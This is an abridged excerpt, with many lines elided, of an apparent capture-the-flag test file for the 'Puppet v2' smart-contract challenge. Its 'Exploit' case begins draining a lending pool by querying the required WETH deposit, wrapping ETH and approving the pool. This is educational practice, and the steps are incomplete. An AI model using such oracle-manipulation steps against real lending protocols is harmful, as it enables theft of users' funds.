...
describe('[Challenge] Puppet v2', function () {
  ...
  const ATTACKER_INITIAL_TOKEN_BALANCE =
    ethers.utils.parseEther('10000');
  const POOL_INITIAL_TOKEN_BALANCE =
  ...
  before(async function () {
    ...
    expect(
      await this.uniswapExchange.balanceOf(deployer.address)
    ).to.be.gt('0');
  ...
  it('Exploit', async function () {
    ...
    let pBal = await this.token.balanceOf(attacker.address);
    ...
    v = await this.lendingPool.calculateDepositOfWETHRequired(
      ethers.utils.parseEther('1000000')
    );
    ...
    await this.weth
      .connect(attacker)
      .deposit({ value: v.toString() });

    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, ethBalance);
